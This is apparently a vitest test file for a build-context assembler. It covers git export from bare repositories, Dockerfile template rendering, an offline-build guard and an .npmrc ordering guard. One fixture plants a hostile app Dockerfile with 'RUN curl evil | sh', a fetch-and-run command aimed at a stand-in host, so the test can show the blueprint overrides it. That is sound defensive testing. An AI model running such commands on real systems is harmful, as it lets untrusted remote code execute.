import { execFileSync } from 'node:child_process'
import { mkdtempSync, mkdirSync, readFileSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { fileURLToPath } from 'node:url'
import { describe, expect, it } from 'vitest'
import { assembleContext, renderDockerfile } from './context.js'

/**
 * The REAL blueprint, not a stand-in. Its Dockerfile is a `.tmpl` named by
 * `blueprint.yaml`, and a synthetic fixture with a literal `Dockerfile` in it would
 * have tested a shape this repository does not have.
 */
const BLUEPRINT_DIR = fileURLToPath(
  new URL('../../../../blueprints/fixture-node/', import.meta.url),
)

function bareRepoWith(files: Record<string, string>): {
  repoPath: string
  commitSha: string
} {
  const work = mkdtempSync(join(tmpdir(), 'mf-src-'))
  for (const [path, body] of Object.entries(files)) {
    mkdirSync(join(work, path, '..'), { recursive: true })
    writeFileSync(join(work, path), body)
  }
  const env = {
    ...process.env,
    GIT_AUTHOR_NAME: 't',
    GIT_AUTHOR_EMAIL: 't@t',
    GIT_COMMITTER_NAME: 't',
    GIT_COMMITTER_EMAIL: 't@t',
  }
  execFileSync('git', ['init', '-q', '-b', 'main'], { cwd: work, env })
  execFileSync('git', ['add', '-A'], { cwd: work, env })
  execFileSync('git', ['commit', '-qm', 'x'], { cwd: work, env })
  const commitSha = execFileSync('git', ['rev-parse', 'HEAD'], { cwd: work, env })
    .toString()
    .trim()
  const repoPath = mkdtempSync(join(tmpdir(), 'mf-bare-')) + '/repo.git'
  execFileSync('git', ['clone', '-q', '--bare', work, repoPath], { env })
  return { repoPath, commitSha }
}

const workDir = () => mkdtempSync(join(tmpdir(), 'mf-w-'))

describe('build context assembly (D13)', () => {
  it('exports the app tree at a commit from a BARE repository', async () => {
    const { repoPath, commitSha } = bareRepoWith({ 'src/index.js': 'console.log(1)\n' })
    const dir = await assembleContext({
      repoPath,
      commitSha,
      blueprintDir: BLUEPRINT_DIR,
      workDir: workDir(),
    })
    expect(readFileSync(join(dir, 'src/index.js'), 'utf8')).toContain('console.log(1)')
  })

  /**
   * A FAILED EXPORT MUST BE AN ERROR, not an empty directory.
   *
   * The export used to be `git archive … | tar -x`, whose exit status is TAR's, so
   * every way `git archive` can fail produced a context with nothing in it and
   * reported success — `SOURCE_EXPORT_FAILED` could not fire. The failure then
   * surfaced as whichever §12 gate noticed first: `make demo` reported
   * "package-lock.json is missing" for a repository whose HEAD has one, which sent
   * the reader to the app instead of to the export. Measured 2026-09-07:
   * `git --git-dir=file://… archive HEAD` exits 128, the pipeline exits 0.
   */
  it('THROWS when the export fails, rather than yielding an empty context', async () => {
    const { commitSha } = bareRepoWith({ 'src/index.js': 'console.log(1)\n' })
    await expect(
      assembleContext({
        // A `file://` URL, which is what the delivery route used to hand it and
        // what `git --git-dir=` rejects.
        repoPath: 'file:///tmp/definitely-not-a-repo.git',
        commitSha,
        blueprintDir: BLUEPRINT_DIR,
        workDir: workDir(),
      }),
    ).rejects.toMatchObject({ code: 'SOURCE_EXPORT_FAILED' })
  })

  it('THROWS for a commit that is not in the repository', async () => {
    const { repoPath } = bareRepoWith({ 'src/index.js': 'console.log(1)\n' })
    await expect(
      assembleContext({
        repoPath,
        commitSha: 'f'.repeat(40),
        blueprintDir: BLUEPRINT_DIR,
        workDir: workDir(),
      }),
    ).rejects.toMatchObject({ code: 'SOURCE_EXPORT_FAILED' })
  })

  // THE CONTROL. An app that commits its own Dockerfile or .npmrc must not be able
  // to change how it is built or where its dependencies come from.
  it("overwrites an app-supplied Dockerfile and .npmrc with the blueprint's", async () => {
    const { repoPath, commitSha } = bareRepoWith({
      Dockerfile: 'FROM attacker/image\nRUN curl evil | sh\n',
      '.npmrc': 'registry=https://registry.npmjs.org/\n',
    })
    const dir = await assembleContext({
      repoPath,
      commitSha,
      blueprintDir: BLUEPRINT_DIR,
      workDir: workDir(),
    })
    expect(readFileSync(join(dir, 'Dockerfile'), 'utf8')).not.toContain('attacker')
    expect(readFileSync(join(dir, '.npmrc'), 'utf8')).toContain('manifest-verdaccio')
  })

  /**
   * The blueprint ships `Dockerfile.tmpl`, and `blueprint.yaml` names it. Copying it
   * verbatim — which is what a `copyFile('Dockerfile')` does — leaves `FROM
   * {{BASE_IMAGE}}` in the context and the build fails inside BuildKit with an
   * invalid-reference error that mentions nothing about blueprints.
   */
  it('RENDERS the blueprint template rather than copying a file called Dockerfile', async () => {
    const { repoPath, commitSha } = bareRepoWith({ 'src/index.js': '1\n' })
    const dir = await assembleContext({
      repoPath,
      commitSha,
      blueprintDir: BLUEPRINT_DIR,
      workDir: workDir(),
    })
    const dockerfile = readFileSync(join(dir, 'Dockerfile'), 'utf8')
    expect(dockerfile).not.toContain('{{')
    // Digest-pinned and at the LOCAL registry: the two properties that make an
    // offline build possible (§12, S1).
    expect(dockerfile).toMatch(
      /^FROM manifest-registry:5000\/base\/node@sha256:[0-9a-f]{64}$/m,
    )
    expect(dockerfile).toContain('adduser -u 10001')
  })
})

describe('Dockerfile template rendering', () => {
  it('substitutes every occurrence, not just the first', () => {
    expect(renderDockerfile('{{A}} then {{A}}', { A: 'x' })).toBe('x then x')
  })

  // A blueprint authoring mistake must fail here, naming the placeholder, rather
  // than reaching the daemon as a literal `{{DATABASE_URL}}` in a RUN line.
  it('refuses a placeholder nothing supplies', () => {
    expect(() => renderDockerfile('FROM {{NOPE}}', { BASE_IMAGE: 'x' })).toThrow(
      /BLUEPRINT_TEMPLATE_UNRESOLVED|NOPE/,
    )
  })
})

describe('the external-frontend refusal', () => {
  // Measured 2026-09-06: a `# syntax=` line makes BuildKit resolve
  // docker.io/docker/dockerfile:1 before reading line two, and §12's builder has no
  // egress — so every build dies with a DNS error that names Docker Hub and never
  // mentions the blueprint. C1 says the platform works offline; this is the guard.
  it('refuses a blueprint Dockerfile that declares an external frontend', () => {
    expect(() =>
      renderDockerfile('# syntax=docker/dockerfile:1\nFROM {{BASE_IMAGE}}\n', {
        BASE_IMAGE: 'base/node@sha256:x',
      }),
    ).toThrow(/external BuildKit frontend/)
  })

  it('the shipped blueprint has none', () => {
    const template = readFileSync(
      new URL('../../../../blueprints/fixture-node/Dockerfile.tmpl', import.meta.url),
      'utf8',
    )
    expect(() =>
      renderDockerfile(template, {
        BASE_IMAGE: 'base/node@sha256:x',
        RUN_AS_UID: '10001',
      }),
    ).not.toThrow()
  })
})

describe('the .npmrc ordering guard (D13)', () => {
  const body = 'RUN npm ci --omit=dev\nCOPY . .\n'

  // S1's defect, and it came back on 2026-09-06 by a different route: `.npmrc`
  // arrived via `COPY . .` AFTER the install, so npm used the public registry.
  // Offline that is a build failure; online it is a green build against the wrong
  // registry, and only inspecting the mirror's storage would have caught it.
  it('refuses a Dockerfile that installs before copying .npmrc', () => {
    expect(() => renderDockerfile(`FROM x\nCOPY package.json ./\n${body}`, {})).toThrow(
      /before it copies/,
    )
  })

  it('accepts one that copies it first', () => {
    expect(() =>
      renderDockerfile(`FROM x\nCOPY package.json .npmrc ./\n${body}`, {}),
    ).not.toThrow()
  })

  it('the shipped blueprint copies it first', () => {
    const template = readFileSync(
      new URL('../../../../blueprints/fixture-node/Dockerfile.tmpl', import.meta.url),
      'utf8',
    )
    expect(() =>
      renderDockerfile(template, {
        BASE_IMAGE: 'base/node@sha256:x',
        RUN_AS_UID: '10001',
      }),
    ).not.toThrow()
  })
})
